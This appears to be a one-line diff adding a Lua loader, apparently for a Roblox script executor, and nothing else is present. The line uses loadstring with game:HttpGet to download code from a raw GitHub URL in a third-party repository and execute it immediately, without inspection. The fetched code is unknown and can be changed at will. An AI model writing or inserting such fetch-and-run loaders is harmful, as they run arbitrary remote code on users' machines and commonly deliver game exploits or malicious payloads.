@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/kukirin-life-testing-spam7-0cwl2cyuf7ntxg.lua"))()
